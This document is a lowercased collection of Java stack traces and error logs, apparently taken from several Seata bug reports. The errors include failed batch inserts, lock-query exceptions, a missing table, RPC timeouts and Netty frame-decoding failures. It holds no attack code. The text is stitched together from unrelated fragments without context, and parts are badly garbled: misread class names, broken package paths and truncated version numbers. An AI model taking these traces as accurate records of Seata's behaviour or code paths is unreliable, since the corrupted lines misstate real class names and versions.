sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_251] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_251] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_251] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_251] at org.springframework.aop.support.aoputils.invokejoinpointusingreflection(aoputils.java:344) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.reflectivemethodinvocation.invokejoinpoint(reflectivemethodinvocation.java:198) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:163) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.transaction.interceptor.transactionaspectsupport.invokewithintransaction(transactionaspectsupport.java:366) ~[spring-tx-5.2.1.release.jar:5.2.1.release] at org.springframework.transaction.interceptor.transactioninterceptor.invoke(transactioninterceptor.java:99) ~[spring-tx-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:186) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:212) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at com.sun.proxy.$proxy168.insert(unknown source) ~[na:na] at com.qianxian.module.service.controller.modulecontroller.hello(modulecontroller.java:35) ~[classes/:na] at com.qianxian.module.service.controller.modulecontroller$$fastclassbyspringcglib$$5ff8ab5d.invoke(<generated>) ~[classes/:na] at org.springframework.cglib.proxy.methodproxy.invoke(methodproxy.java:218) ~[spring-core-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.cglibaopproxy$cglibmethodinvocation.invokejoinpoint(cglibaopproxy.java:769) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:163) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.cglibaopproxy$cglibmethodinvocation.proceed(cglibaopproxy.java:747) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at io.seata.spring.annotation.globaltransactionalinterceptor$1.execute(globaltransactionalinterceptor.java:109) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.tm.api.transactionaltemplate.execute(transactionaltemplate.java:104) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.spring.annotation.globaltransactionalinterceptor.handleglobaltransaction(globaltransactionalinterceptor.java:106) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.spring.annotation.globaltransactionalinterceptor.invoke(globaltransactionalinterceptor.java:83) ~[seata-all-1.2.0.jar:1.2.0] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:186) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.cglibaopproxy$cglibmethodinvocation.proceed(cglibaopproxy.java:747) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at org.springframework.aop.framework.cglibaopproxy$dynamicadvisedinterceptor.intercept(cglibaopproxy.java:689) ~[spring-aop-5.2.1.release.jar:5.2.1.release] at com.qianxian.module.service.controller.modulecontroller$$enhancerbyspringcglib$$c73e434c.hello(<generated>) ~[classes/:na] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_251] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_251] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_251] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_251] at org.springframework.web.method.support.invocablehandlermethod.doinvoke(invocablehandlermethod.java:190) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.springframework.web.method.support.invocablehandlermethod.invokeforrequest(invocablehandlermethod.java:138) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.mvc.method.annotation.servletinvocablehandlermethod.invokeandhandle(servletinvocablehandlermethod.java:106) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.invokehandlermethod(requestmappinghandleradapter.java:888) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.handleinternal(requestmappinghandleradapter.java:793) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.mvc.method.abstracthandlermethodadapter.handle(abstracthandlermethodadapter.java:87) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:1040) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:943) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:1006) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at org.springframework.web.servlet.frameworkservlet.doget(frameworkservlet.java:898) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at javax.servlet.http.httpservlet.service(httpservlet.java:634) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.springframework.web.servlet.frameworkservlet.service(frameworkservlet.java:883) ~[spring-webmvc-5.2.1.release.jar:5.2.1.release] at javax.servlet.http.httpservlet.service(httpservlet.java:741) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:231) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.tomcat.websocket.server.wsfilter.dofilter(wsfilter.java:53) ~[tomcat-embed-websocket-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at com.qianxian.module.service.filter.securityfilter.dofilter(securityfilter.java:60) ~[classes/:na] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.springframework.web.filter.requestcontextfilter.dofilterinternal(requestcontextfilter.java:100) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:119) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.springframework.web.filter.formcontentfilter.dofilterinternal(formcontentfilter.java:93) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:119) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.springframework.web.filter.characterencodingfilter.dofilterinternal(characterencodingfilter.java:201) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:119) ~[spring-web-5.2.1.release.jar:5.2.1.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:202) ~[tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:96) [tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.authenticator.authenticatorbase.invoke(authenticatorbase.java:526) [tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:139) [tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:92) [tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:74) [tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.catalina.connector.coyoteadapter.service(coyoteadapter.java:343) [tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.coyote.http11.http11processor.service(http11processor.java:408) [tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.coyote.abstractprocessorlight.process(abstractprocessorlight.java:66) [tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.coyote.abstractprotocol$connectionhandler.process(abstractprotocol.java:861) [tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.tomcat.util.net.nioendpoint$socketprocessor.dorun(nioendpoint.java:1579) [tomcat-embed-core-9.0.27.jar:9.0.27] at org.apache.tomcat.util.net.socketprocessorbase.run(socketprocessorbase.java:49) [tomcat-embed-core-9.0.27.jar:9.0.27] at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) [na:1.8.0_251] at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) [na:1.8.0_251] at org.apache.tomcat.util.threads.taskthread$wrappingrunnable.run(taskthread.java:61) [tomcat-embed-core-9.0.27.jar:9.0.27] at java.lang.thread.run(thread.java:748) [na:1.8.0_251]
``` o.seata.rm.datasource.sql.struct.cache.postgresqltablemetacache#resultsetmetatoschema
col.setcharoctetlength(rscolumns.getint("char_octet_length")); ostgre scolumns.getint("char_octet_length") scolumns.getstring("char_octet_length") col.setcharoctetlength(rscolumns.getint("char_octet_length")); seata .2.0
sharding .0.0
postgre 3.2
postgre 2.2.12 - jdk version : 1.8
- os : windows
insert into t_member1 (merchantid,member_name,create_time, id) values (?, ?, now(), ?), (?, ?, now(), ?), (?, ?, now(), ?) ::: [214, , 470255886078574594, 214, , 470255886078574593, 214, , 470255886078574592]
insert into t_member (merchantid,member_name,create_time) values <foreach collection="list" separator="," index="member" item="member" > ( #{member.merchantid}, #{member.membername}, now() ) </foreach>`
2020-05-21 14:55:38.020 default [http-nio-8082-exec-2] error i.seata.rm.datasource.exec.abstractdmlbaseexecutor - execute executeautocommittrue error:9
java.lang.arrayindexoutofboundsexception: 9 at io.seata.rm.datasource.exec.insertexecutor.getpkvaluesbycolumn(insertexecutor.java:151) at io.seata.rm.datasource.exec.insertexecutor.afterimage(insertexecutor.java:78) at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommitfalse(abstractdmlbaseexecutor.java:88) at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.lambda$executeautocommittrue$0
java.lang.runtimeexception: unknow situation! at io.seata.rm.datasource.datasourcemanager.lockquery(datasourcemanager.java:91) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.rm.defaultresourcemanager.lockquery(defaultresourcemanager.java:109) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.rm.datasource.connectionproxy.checklock(connectionproxy.java:116) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.rm.datasource.connectionproxy.processlocalcommitwithgloballocks(connectionproxy.java:205) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.rm.datasource.connectionproxy.docommit(connectionproxy.java:198) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.rm.datasource.connectionproxy.lambda$commit$0(connectionproxy.java:184) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.rm.datasource.connectionproxy$lockretrypolicy.execute(connectionproxy.java:289) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.rm.datasource.connectionproxy.commit(connectionproxy.java:183) ~[seata-all-1.2.0.jar:1.2.0] at org.springframework.jdbc.datasource.datasourcetransactionmanager.docommit(datasourcetransactionmanager.java:331) ~[spring-jdbc-5.2.2.release.jar:5.2.2.release] at org.springframework.transaction.support.abstractplatformtransactionmanager.processcommit(abstractplatformtransactionmanager.java:744) ~[spring-tx-5.2.2.release.jar:5.2.2.release] at org.springframework.transaction.support.abstractplatformtransactionmanager.commit(abstractplatformtransactionmanager.java:712) ~[spring-tx-5.2.2.release.jar:5.2.2.release] at org.springframework.transaction.interceptor.transactionaspectsupport.committransactionafterreturning(transactionaspectsupport.java:631) ~[spring-tx-5.2.2.release.jar:5.2.2.release] at org.springframework.transaction.interceptor.transactionaspectsupport.invokewithintransaction(transactionaspectsupport.java:385) ~[spring-tx-5.2.2.release.jar:5.2.2.release] at org.springframework.transaction.interceptor.transactioninterceptor.invoke(transactioninterceptor.java:99) ~[spring-tx-5.2.2.release.jar:5.2.2.release] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:186) ~[spring-aop-5.2.2.release.jar:5.2.2.release] at org.springframework.aop.framework.cglibaopproxy$cglibmethodinvocation.proceed(cglibaopproxy.java:747) ~[spring-aop-5.2.2.release.jar:5.2.2.release] at io.seata.spring.annotation.globaltransactionalinterceptor.lambda$handlegloballock$0(globaltransactionalinterceptor.java:94) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.rm.globallocktemplate.execute(globallocktemplate.java:45) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.spring.annotation.globaltransactionalinterceptor.handlegloballock(globaltransactionalinterceptor.java:92) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.spring.annotation.globaltransactionalinterceptor.invoke(globaltransactionalinterceptor.java:85) ~[seata-all-1.2.0.jar:1.2.0] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:186) ~[spring-aop-5.2.2.release.jar:5.2.2.release] at org.springframework.aop.framework.cglibaopproxy$cglibmethodinvocation.proceed(cglibaopproxy.java:747) ~[spring-aop-5.2.2.release.jar:5.2.2.release] at org.springframework.aop.framework.cglibaopproxy$dynamicadvisedinterceptor.intercept(cglibaopproxy.java:689) ~[spring-aop-5.2.2.release.jar:5.2.2.release] at io.seata.samples.integration.account.service.taccountserviceimpl$$enhancerbyspringcglib$$dfa5f89b.decreaseaccount(<generated>) ~[classes/:na] at io.seata.samples.integration.account.controller.taccountcontroller.decreaseaccount(taccountcontroller.java:37) ~[classes/:na] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_161] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_161] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_161] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_161] at org.springframework.web.method.support.invocablehandlermethod.doinvoke(invocablehandlermethod.java:190) ~[spring-web-5.2.2.release.jar:5.2.2.release] at org.springframework.web.method.support.invocablehandlermethod.invokeforrequest(invocablehandlermethod.java:138) ~[spring-web-5.2.2.release.jar:5.2.2.release] at org.springframework.web.servlet.mvc.method.annotation.servletinvocablehandlermethod.invokeandhandle(servletinvocablehandlermethod.java:106) ~[spring-webmvc-5.2.2.release.jar:5.2.2.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.invokehandlermethod(requestmappinghandleradapter.java:888) ~[spring-webmvc-5.2.2.release.jar:5.2.2.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.handleinternal(requestmappinghandleradapter.java:793) ~[spring-webmvc-5.2.2.release.jar:5.2.2.release] at org.springframework.web.servlet.mvc.method.abstracthandlermethodadapter.handle(abstracthandlermethodadapter.java:87) ~[spring-webmvc-5.2.2.release.jar:5.2.2.release] at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:1040) ~[spring-webmvc-5.2.2.release.jar:5.2.2.release] at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:943) ~[spring-webmvc-5.2.2.release.jar:5.2.2.release] at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:1006) ~[spring-webmvc-5.2.2.release.jar:5.2.2.release] at org.springframework.web.servlet.frameworkservlet.doget(frameworkservlet.java:898) ~[spring-webmvc-5.2.2.release.jar:5.2.2.release] at javax.servlet.http.httpservlet.service(httpservlet.java:634) ~[tomcat-embed-core-9.0.29.jar:9.0.29] at org.springframework.web.servlet.frameworkservlet.service(frameworkservlet.java:883) ~[spring-webmvc-5.2.2.release.jar:5.2.2.release] at javax.servlet.http.httpservlet.service(httpservlet.java:741) ~[tomcat-embed-core-9.0.29.jar:9.0.29] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:231) ~[tomcat-embed-core-9.0.29.jar:9.0.29] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.29.jar:9.0.29] at org.apache.tomcat.websocket.server.wsfilter.dofilter(wsfilter.java:53) ~[tomcat-embed-websocket-9.0.29.jar:9.0.29] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.29.jar:9.0.29] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.29.jar:9.0.29] at org.springframework.web.filter.requestcontextfilter.dofilterinternal(requestcontextfilter.java:100) ~[spring-web-5.2.2.release.jar:5.2.2.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:119) ~[spring-web-5.2.2.release.jar:5.2.2.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.29.jar:9.0.29] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.29.jar:9.0.29] at org.springframework.web.filter.formcontentfilter.dofilterinternal(formcontentfilter.java:93) ~[spring-web-5.2.2.release.jar:5.2.2.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:119) ~[spring-web-5.2.2.release.jar:5.2.2.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.29.jar:9.0.29] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.29.jar:9.0.29] at org.springframework.web.filter.characterencodingfilter.dofilterinternal(characterencodingfilter.java:201) ~[spring-web-5.2.2.release.jar:5.2.2.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:119) ~[spring-web-5.2.2.release.jar:5.2.2.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.29.jar:9.0.29] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.29.jar:9.0.29] at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:202) ~[tomcat-embed-core-9.0.29.jar:9.0.29] at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:96) [tomcat-embed-core-9.0.29.jar:9.0.29] at org.apache.catalina.authenticator.authenticatorbase.invoke(authenticatorbase.java:526) [tomcat-embed-core-9.0.29.jar:9.0.29] at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:139) [tomcat-embed-core-9.0.29.jar:9.0.29] at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:92) [tomcat-embed-core-9.0.29.jar:9.0.29] at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:74) [tomcat-embed-core-9.0.29.jar:9.0.29] at org.apache.catalina.connector.coyoteadapter.service(coyoteadapter.java:343) [tomcat-embed-core-9.0.29.jar:9.0.29] at org.apache.coyote.http11.http11processor.service(http11processor.java:367) [tomcat-embed-core-9.0.29.jar:9.0.29] at org.apache.coyote.abstractprocessorlight.process(abstractprocessorlight.java:65) [tomcat-embed-core-9.0.29.jar:9.0.29] at org.apache.coyote.abstractprotocol$connectionhandler.process(abstractprotocol.java:860) [tomcat-embed-core-9.0.29.jar:9.0.29] at org.apache.tomcat.util.net.nioendpoint$socketprocessor.dorun(nioendpoint.java:1591) [tomcat-embed-core-9.0.29.jar:9.0.29] at org.apache.tomcat.util.net.socketprocessorbase.run(socketprocessorbase.java:49) [tomcat-embed-core-9.0.29.jar:9.0.29] at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) [na:1.8.0_161] at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) [na:1.8.0_161] at org.apache.tomcat.util.threads.taskthread$wrappingrunnable.run(taskthread.java:61) [tomcat-embed-core-9.0.29.jar:9.0.29] at java.lang.thread.run(thread.java:748) [na:1.8.0_161]
2020-04-28 01:51:35.438 error 2632 --- [nio-8082-exec-1] i.s.r.d.s.s.c.abstracttablemetacache : get cache error:table 'db_order.a' doesn't exist java.sql.sqlsyntaxerrorexception: table 'db_order.a' doesn't exist at com.mysql.cj.jdbc.exceptions.sqlerror.createsqlexception(sqlerror.java:118) ~[mysql-connector-java-8.0.11.jar:8.0.11] at com.mysql.cj.jdbc.exceptions.sqlerror.createsqlexception(sqlerror.java:95) ~[mysql-connector-java-8.0.11.jar:8.0.11] at com.mysql.cj.jdbc.exceptions.sqlexceptionsmapping.translateexception(sqlexceptionsmapping.java:122) ~[mysql-connector-java-8.0.11.jar:8.0.11] at com.mysql.cj.jdbc.statementimpl.executequery(statementimpl.java:1247) ~[mysql-connector-java-8.0.11.jar:8.0.11] at com.alibaba.druid.pool.druidpooledstatement.executequery(druidpooledstatement.java:291) ~[druid-1.1.10.jar:1.1.10] at io.seata.rm.datasource.sql.struct.cache.mysqltablemetacache.fetchschema(mysqltablemetacache.java:84) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.rm.datasource.sql.struct.cache.abstracttablemetacache.lambda$gettablemeta$0(abstracttablemetacache.java:61) ~[seata-all-1.2.0.jar:1.2.0] ``` ```
io.seata.core.rpc.netty.abstractrpcremoting - wait response error:cost 30004ms,ip:xxxxxx:8091,request:xid=xxxxxx:8091:2041601441,extradata=null
io.seata.tm.api.defaultglobaltransaction - failed to report global commit [ d], retry countdown: 5, reason: rpc timeout
illegalarqumentexc2020-04-27 18:47:03.295 -error [nettyclientselector tmrole 1] seata corelrboe netly 1 protocoivneclttluxception: not support typecode,-9510io.seata.core.rpc.netty.v1.protocolv1decoder - decode frame error! at io.seata.serializer .seata .messagecodecfactory getmergeresponseinstancebycode (messagecodecfactory java:342) at io.seata.serializer.seata
seataseriai0.seata
seata.messagecodecfactory
getmessage (lizer.deserialize (seataserializer.java:78)(messagecodecfactory-java:281)at io.seata.core.rpc.netty.v1.protocolldecoder .decodeframe (protocolvldecoder.java:141)1t io.seata.core
rpc.netty.v1
protocolv1decoder
decode (protocolvldecoder.java:86) t io.netty
lengthfieldbasedframedecoder
decode (lengthfieldbasedframedecoder -java :343) at i0-netty handler
codec.bytetomessagedecoder .decoderemovalreentryprotection (bytetomssagedecoder
java:489)at io.netty.handler.codec.bytetomessagedecoder
calldecode (bytetomessagedecoder .java:428) io
netty handler.codec.bytetomessagedecoder
channelread (bytetomessagedecoder.java:265)ioneteo channel
abstractchannelhandlercontext
invo kechannelread (abstractchannelhandlercontext.java:362)1t io.netty.channel.abstractchannelhandlercontext
invokechannelread (abstractchannelhandlercontextijava:348)ati0.netty channel
abstractchannelhandlercontext
firechannelread (abstractchannelhandlercontext.java:340)t io.netty
timeout.idlestatehandler.channelread (idlestatehandler.java:286) at io.netty
bstractchannelhandlercontext
invokechannelread (abstractchannelhandlercontext
java:362)t io.netty-channel.abstractchannelhandlerontext.invokehannelread (abstractchanne lhandlercontext .java:348)t io.netty channel.abstractchannelhandlercontext
firechannelread (abstractchannelhandlercontextjava:340)t io.netty
defaultchannelpipelinesheadcontext
channelread (defaultchannelpipeline.java: 1414) t io.netty.channel.bstractchannelhandlercontext invokechannelread (abstractchannelhandlercontext
java:362)io.netty channel
abstractchannelhandlercontext
invokechannelread (abstractchannelhandlercontext
java: 348) o.netty
defaultchannelpipeline
firechannelread (de faultchannelpipeline.java:945) t io
abstractniobytechannel$niobyteunsafe read(abstractniobytechannel
java:146)atio.netty- channel.nio nioeventloop
processselectedkey (nioeventloop.java:645) t io.netty
nioeventloop
processselectedkeysoptimi zed (nioeventloop.java:580)tio.netty
channel.nio.nioeventloop
processselectedkeys (nioeventloop.java:497)tio.netty
channel.nio.nioeventloop
run (nioeventloop
java:459) at io
netty.util.concurrent
singlethreadeventexecutor$5
run (singlethreadeventexecutor -java:886)atio
netty.ut il.concurrent
fastthreadlocalrunnable
run (fastthreadlocal runnable.java:30)tjava.lang thread
run(thread.java:748) 2020-04-27 18:47:03.302 -error [nettyclientselector tmrole 1] io.seata
netty .abstractrpcremotingclient [][][] [] [] 0318
decoderexception: java
illegalargumentexception: not support typecode,-9510 at io.netty
bytetomessagedecoder
calldecode (bytetomessagedecoder.java:459)t io.netty
bytetomessagedecoder
channelread (bytetomessagedecoder
java:265) at io.netty
abstractchannelhandlercontext
invokechannelread (abstractchannelhandlercontext.java:362)at io
channel.abstractchannelhandlercontext
invokechannelread (abstractchannelhandlercontext.java :348)at io.netty
channel.abstractchannelhandlercontext
firechannelread (abstractchannelhandlercontext.java:340)at io.netty.handler
timeout.idlestatehandler
channelread (idlestatehandler
java:286) at io
channel .abstractchannelhandlercontext
invokechannelread (abstractchannelhandlercontext.java:362)at io.netty
channel.abstractchannelhandlercontext
invokechannelread (abstractchannelhandlercontext
java:348)at io.netty
channel.abstractchannelhandlercontext
firechannelread (abstractchannelhandlercontext.java:340)at io.netty channel.defaultchannelpipeline$headcontext
channelread (defaultchannelpipeline.java:1414) at io.netty
channel.abstractchannelhandlercontext
invokechannelread (abstractchannelhandlercontext.java:362)at io.netty
abstractchannelhandlercontext
invokechannelread (abstractchannelhandlercontext
java:348)at io.netty
defaultchannelpipeline
firechannelread (defaultchannelpipeline
java:945) at io.netty.channel
abstractniobytechannel$niobyteunsafe
read (abstractniobytechannel.java:146)at io.netty
nio nioeventloop .processselectedkey (nioeventloop .java:645) t io.netty.channel.nio.nioeventloop processselectedkeysoptimized (nioeventloop.java:580)t io
netty.channel
nio.nioeventloop .processselectedkeys (nioeventloop.java: 497)at io.netty channel
nioeventloop
run (nioeventloop
java:459) at io.netty.util
singlethreadeventexecutor$5
run (singlethreadeventexecutor.java:886)at io.netty.util
fastthreadlocalrunnable
run (fastthreadlocalrunnable.java:30)at java
lang .thread
run (thread.java:748) caused by: java.lang
illegalargumentexception: not support typecode,-9510 at io.seata.serializer.seata.messagecodecfactory.getmergeresponseinstancebycode (messagecodecfactory
java:342)at ioseata.serializer
messagecodecfactory
getmessage (messagecodecfactory.java:281)at io.seata.serializer
seata.seataserializer .deserialize (seataserializer.java:78) at e io.seata
protocolv1decoder .decodef rame (protocolv1decoder.java:141) at io.seata
protocolv1decoder .decode (protocolv1decoder.java:86) at io.netty .handler
codec.lengthfieldbased ramedecoder decode (lengthfieldbasedframedecoder java:343) at io.netty handler
codec.bytetomessagedecoder
decoderemovalreentryprotection (bytetomessagedecoder.java:489)at io.netty
bytetomessagedecoder
calldecode (bytetomessagedecoder.java:428) 20commonframes omitted
error[nettyclientselector_tmrole_1]io.seata.core.rpc.netty.abstractrpcremotingclient 0318
io.netty.handler.codec.toolongframeexception: adjusted frame length exceeds 8388608: 3671720192- discarded
at io.netty.handler.codec.lengthfieldbasedframedecoder.fail(lengthfieldbasedframedecoder.java:522)
at io.netty.handler.codec.lengthfieldbasedframedecoder.failifnecessary(lengthfieldbasedframedecoder.java:500)
at io.netty.handler.codec.lengthfieldbasedframedecoder.exceededframelength(lengthfieldbasedframedecoder.java:387)
at io.netty.handler.codec.lengthfieldbasedframedecoder.decode(lengthfieldbasedframedecoder.java:430)
at io.seata.core.rpc.netty.v1.protocolv1decoder.decode(protocolv1decoder.java:82)
at io.netty.handler.codec.lengthfieldbasedframedecoder.decode(lengthfieldbasedframedecoder.java:343)
at io.netty.handler.codec.bytetomessagedecoder.decoderemovalreentryprotection(bytetomessagedecoder.java:502)
at io.netty.handler.codec.bytetomessagedecoder.calldecode(bytetomessagedecoder.java:441)
at io.netty.handler.codec.bytetomessagedecoder.channelread(bytetomessagedecoder.java:278)
at io.netty.channel.abstractchannelhandlercontext.invokechannelread(abstractchannelhandlercontext.java:362)
at io.netty.channel.abstractchannelhandlercontext.invokechannelread(abstractchannelhandlercontext.java:348)
at io.netty.channel.abstractchannelhandlercontext.firechannelread(abstractchannelhandlercontext.java:340)
at io.netty.handler.timeout.idlestatehandler.channelread(idlestatehandler.java:286)
at io.netty.channel.abstractchannelhandlercontext.invokechannelread(abstractchannelhandlercontext.java:362)
at io.netty.channel.abstractchannelhandlercontext.invokechannelread(abstractchannelhandlercontext.java:348)
at io.netty.channel.abstractchannelhandlercontext.firechannelread(abstractchannelhandlercontext.java:340)
at io.netty.channel.defaultchannelpipeline$headcontext.channelread(defaultchannelpipeline.java:1434)
